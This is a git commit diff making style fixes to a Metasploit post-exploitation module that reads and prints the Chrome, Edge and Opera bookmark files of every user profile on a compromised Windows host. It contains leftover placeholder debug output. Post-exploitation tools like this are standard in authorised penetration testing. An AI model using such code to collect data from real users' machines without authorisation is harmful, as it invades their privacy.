d3e32eca5b95e4b16658b2fd9aceacf330e79a08
jerrelgordon <73038486+jerrelgordon@users.noreply.github.com>
2022-04-05 12:59:01 -0400

    Style fixes

--- modules/post/windows/gather/get_bookmarks.rb
+++ modules/post/windows/gather/get_bookmarks.rb
@@ -1,4 +1,3 @@
-
 class MetasploitModule < Msf::Post
     include Msf::Post::File
     include Msf::Post::Windows::UserProfiles
@@ -19,73 +18,51 @@ class MetasploitModule < Msf::Post
     end
 
     def run
-      
-      GetBookmarks("GoogleChrome") #gets bookmarks for google chrome
-      GetBookmarks("Opera") #gets bookmarks for opera
-      GetBookmarks("Edge") #gets bookmarks for edge
-
+      get_bookmarks("GoogleChrome") # gets bookmarks for google chrome
+      get_bookmarks("Opera") # gets bookmarks for opera
+      get_bookmarks("Edge") # gets bookmarks for edge
     end
 
 
-    def GetBookmarks (browser)
-
+    def get_bookmarks(browser)
       print_status("Bookmarks on: " + browser) 
-      fileexists = false #initializes file as not found
-  
+      fileexists = false # initializes file as not found
       grab_user_profiles().each do |user| #parses information for all users on target machine into a list.
-        
-        #If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"
-
-        
+        # If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"
         if (browser == "GoogleChrome")
-        
-          next unless user['LocalAppData']
-        
-          bookmark_path = user['LocalAppData'] + "\\Google\\Chrome\\User Data\\Default\\Bookmarks" #sets path for Google Chrome Bookmarks
-          puts "Google Chrome Google Chrome Google Chrome"
-          puts "Google Chrome Google Chrome Google Chrome"
-          puts "Google Chrome Google Chrome Google Chrome"
-          puts "Google Chrome Google Chrome Google Chrome"
-          puts "Google Chrome Google Chrome Google Chrome"
-
+            next unless user['LocalAppData']
+            bookmark_path = user['LocalAppData'] + "\\Google\\Chrome\\User Data\\Default\\Bookmarks" #sets path for Google Chrome Bookmarks
+            print_status("Google Chrome Google Chrome Google Chrome")
+            print_status("Google Chrome Google Chrome Google Chrome")
+            print_status("Google Chrome Google Chrome Google Chrome")
+            print_status("Google Chrome Google Chrome Google Chrome")
         elsif (browser == "Edge")
-          next unless user['LocalAppData']
-          bookmark_path = user['LocalAppData'] + "\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" #sets path for Microsoft Edge Bookmarks
-          puts "Edge Edge Edge"
-          puts "Edge Edge Edge"
-          puts "Edge Edge Edge"
-          puts "Edge Edge Edge"
-          puts "Edge Edge Edge"
-
-
+            next unless user['LocalAppData']
+            bookmark_path = user['LocalAppData'] + "\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" #sets path for Microsoft Edge Bookmarks
+            print_status("Edge Edge Edge")
+            print_status("Edge Edge Edge")
+            print_status("Edge Edge Edge")
+            print_status("Edge Edge Edge")
         elsif (browser == "Opera")
-          next unless user['AppData']
-          bookmark_path = user['AppData'] + "\\Opera Software\\Opera Stable\\Bookmarks" #sets path for Opera Bookmarks
-          puts "Opera Opera Opera"
-          puts "Opera Opera Opera"
-          puts "Opera Opera Opera"
-          puts "Opera Opera Opera"
-          puts "Opera Opera Opera"
-
+            next unless user['AppData']
+            bookmark_path = user['AppData'] + "\\Opera Software\\Opera Stable\\Bookmarks" #sets path for Opera Bookmarks
+            print_status("Opera Opera Opera")
+            print_status("Opera Opera Opera")
+            print_status("Opera Opera Opera")
+            print_status("Opera Opera Opera")
         end
-        
-        next unless file?(bookmark_path) #if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)
-
-          fileexists = true
-          puts "BOOKMARKS FOR " + user['ProfileDir']
-          puts "\n"
-          file = read_file(bookmark_path)
-    
-          puts file
-
+        next unless file?(bookmark_path) # if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)
+            fileexists = true
+            print_status("BOOKMARKS FOR" + user['ProfileDir'] )
+            # puts "BOOKMARKS FOR " + user['ProfileDir']
+            # puts "\n"
+            file = read_file(bookmark_path)
+            # puts file
+            print_good(file)
       end
-
       if (fileexists == false) # if file was not found, prints no file found.
-        puts "No Bookmarks found for " + browser
-      
+        # puts "No Bookmarks found for " + browser
+        print_status("No Bookmarks found for" + browser )
       end
-
     end
-  
-
-  end
+end
